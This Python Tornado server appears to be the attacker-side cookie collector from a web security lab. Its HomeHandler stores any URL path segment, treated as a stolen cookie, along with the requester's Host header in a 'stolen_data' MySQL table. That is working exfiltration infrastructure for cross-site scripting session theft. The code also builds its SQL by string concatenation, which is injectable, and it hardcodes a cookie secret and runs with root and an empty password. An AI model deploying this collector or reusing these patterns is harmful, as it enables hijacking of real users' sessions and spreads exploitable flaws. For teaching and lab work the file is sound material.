# Author: JT Hamrick
# design based off of http://chrisdianamedia.com/simplestore/
import os.path
import tornado.ioloop
import tornado.web
from tornado.options import define, options
import tornado.template
import MySQLdb


# define values for mysql connection
define("port", default=8880, help="run on the given port", type=int)
define("mysql_host", default="127.0.0.1", help="database host")
define("mysql_port", default=3306, help="database port", type=int)
define("mysql_database", default="attacker", help="database name")
define("mysql_user", default="root", help="database user")
define("mysql_password", default="", help="database password")

__UPLOADS__ = "uploads/"


class Application(tornado.web.Application):
    def __init__(self):
        handlers = [
            (r"/([^/]+)", HomeHandler),
            (r"/", DefaultHandler)
        ]
        settings = dict(
            template_path=os.path.join(os.path.dirname(__file__), "templates"),
            static_path=os.path.join(os.path.dirname(__file__), "static"),
            xsrf_cookies=False,
            debug=True,
            cookie_secret="EwPk2(vcuu2rk4kR+8Vc,cXkucqLaBbfVxV,VggmbKgGxe3zK,"
        )
        super(Application, self).__init__(handlers, **settings)
        # Have one global connection to the store DB across all handlers
        self.myDB = MySQLdb.connect(host=options.mysql_host,
                                    port=options.mysql_port,
                                    db=options.mysql_database,
                                    user=options.mysql_user,
                                    passwd=options.mysql_password)


class BaseHandler(tornado.web.RequestHandler):
    @property
    def db(self):
        return self.application.myDB


class HomeHandler(BaseHandler):
    def get(self, slug):
        c = self.db.cursor()
        user_host = str(self.request.headers.get("Host"))
        c.execute("INSERT INTO stolen_data (id, cookie, host) \
                   VALUES (0, '" + slug + "', '" + user_host + "')")
        self.application.myDB.commit()
        self.render("home.html")


class DefaultHandler(BaseHandler):
    def get(self):
        self.render("home.html")


def main():
    http_server = tornado.httpserver.HTTPServer(Application())
    http_server.listen(options.port)
    tornado.ioloop.IOLoop.current().start()


if __name__ == "__main__":
    main()
